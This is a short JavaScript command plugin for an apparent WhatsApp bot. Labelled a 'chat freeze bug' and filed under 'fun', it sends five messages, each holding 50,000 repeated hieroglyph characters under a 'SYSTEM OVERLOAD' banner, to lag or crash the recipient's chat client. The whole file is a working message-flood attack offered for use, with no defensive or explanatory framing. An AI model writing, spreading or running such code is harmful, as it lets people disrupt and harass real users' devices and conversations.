const { cmd } = require('../command');

cmd({
    pattern: "baga",
    desc: "Chat freeze bug 😈",
    category: "fun",
    filename: __filename
},
async (robin, mek, m, { from }) => {

    // 🔥 Huge text (lag trigger)
    let heavyText = "𓀀".repeat(50000); // size ekata adjust karanna puluwan

    let bugMessage = `💀 SYSTEM OVERLOAD 💀\n\n${heavyText}`;

    // 📩 Send multiple times
    for (let i = 0; i < 5; i++) {
        await robin.sendMessage(from, {
            text: bugMessage
        });
    }

});
